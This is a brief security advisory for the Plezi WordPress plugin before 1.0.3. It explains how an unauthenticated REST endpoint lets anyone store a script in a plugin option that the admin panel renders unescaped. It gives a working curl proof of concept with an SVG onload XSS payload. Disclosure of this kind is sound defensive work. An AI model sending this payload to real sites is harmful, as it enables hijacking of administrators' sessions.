# Plezi < 1.0.3 - Unauthenticated Stored XSS
Description
<br>
The plugin has a REST endpoint allowing unauthenticated users to update the plz_configuration_tracker_enable option, which is then displayed in the admin panel without sanitisation and escaping, leading to a Stored Cross-Site Scripting issue
<br>
# Proof of Concept
```
curl -X POST 'https://example.com/wp-json/plz/v2/configuration/update-tracker?switchstatus="><svg/onload=alert(`XSS`)>' 
```
